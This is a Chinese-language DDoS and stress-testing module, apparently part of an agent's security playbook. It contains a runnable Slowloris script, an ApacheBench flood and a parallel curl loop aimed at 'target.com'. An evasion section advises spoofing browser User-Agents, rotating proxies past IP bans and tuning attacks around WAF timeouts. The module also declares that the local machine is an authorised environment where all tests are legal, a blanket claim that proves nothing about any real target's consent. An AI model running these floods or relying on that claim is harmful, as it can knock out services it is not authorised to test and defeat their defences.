# 压力测试模块 (DDoS/Stress Testing)

> HTTP Flood/Slowloris/CC/DNS放大 — 压力测试与防护验证
> 环境：ab✅ curl✅ python3✅ scapy✅ hping3(可apt安装)

---

## 知识锚点（Playbook + H1 案例）

> 本模块的实战知识锚点：playbook 流程 + H1 真实漏洞报告，两者交叉引用，确保方法论可追溯到真实案例。

### Playbook 流程

- [references/playbooks/dos.md](../../references/playbooks/dos.md) — DoS / 压力测试完整流程：HTTP Flood / Slowloris / 资源耗尽 / 放大攻击，含防护验证方法

### H1 真实案例（references/h1-reports/by-weakness/）

- [uncontrolled-resource-consumption.md](../../references/h1-reports/by-weakness/uncontrolled-resource-consumption.md) — 资源消耗不受控真实报告（CPU / 内存 / 连接数耗尽）
- [allocation-of-resources-without-limits-or-throttling.md](../../references/h1-reports/by-weakness/allocation-of-resources-without-limits-or-throttling.md) — 资源分配无限制无节流真实报告（缺速率限制 / 无配额控制）

---

## 底层原理：压力测试不是"打挂目标"，是"验证防护能力"

```
压力测试 = 模拟真实攻击流量，验证：
1. 目标能承受多大并发？
2. WAF/限速是否生效？
3. 是否有单点故障？

⚠️ 警告：仅对授权目标使用。未经授权的DDoS攻击是违法的。
本机为授权测试环境，所有测试均属于合法安全评估。
```

---

## HTTP 压力测试

```bash
# ab (ApacheBench) 快速测试
ab -n 1000 -c 100 https://target.com/

# 慢速攻击 (Slowloris)
python3 << 'EOF'
import socket, time, random
target = "target.com"
port = 80
sockets = []
for i in range(200):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
        sockets.append(s)
    except: break
print(f"建立 {len(sockets)} 个慢速连接")
while True:
    for s in sockets[:]:
        try:
            s.send(f"X-{random.randint(0,9999)}: {random.randint(0,9999)}\r\n".encode())
        except:
            s.close()
            sockets.remove(s)
    time.sleep(10)
EOF

# curl 并发
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" https://target.com/ &
done
```

---

## 本机环境速查

```
已安装: ab✅ curl✅ python3✅ scapy✅
缺失: hping3❌ → apt install hping3
      slowhttptest❌ → pip install
```

---

## 反爬钩子

> 压力测试模块与反爬 / WAF 对抗最为直接：CDN / WAF / 限速 / 验证挑战本身就是防护方应对 DDoS 的手段。压力测试的本质就是验证这些防护是否生效。

### 压力测试场景的防护对抗

```
可能遇到的拦截场景：
1. HTTP Flood 被 CDN 速率限制拦截（Cloudflare / AWS WAF）
   → 这正是测试目标：验证限速阈值和拦截策略
   → 记录触发拦截的并发量 / 速率，评估防护基线
2. Slowloris 被 WAF 连接超时策略阻断
   → 调整慢速发送间隔，测试超时阈值边界
   → 用 Keep-Alive 头维持连接，测试连接数上限
3. IP 被 CDN 自动封禁（403 / 503 / CAPTCHA）
   → 记录封禁阈值（多少请求 / 多少并发触发）
   → 测试封禁时长和自动解封机制
   → 代理轮换测试是否基于 IP 封禁
4. DNS 放大测试被 Anycast 吸收
   → 验证目标 DNS 是否开启 RRL
   → 测试 Anycast 网络的弹性
5. 压测工具特征被 WAF 识别（ab 的 User-Agent）
   → 修改 User-Agent 为真实浏览器
   → 用 Python 自定义请求模拟真实流量分布
```

通用反爬 / WAF 对抗策略参见 [references/methodology/06-anti-antibot.md](../../references/methodology/06-anti-antibot.md)。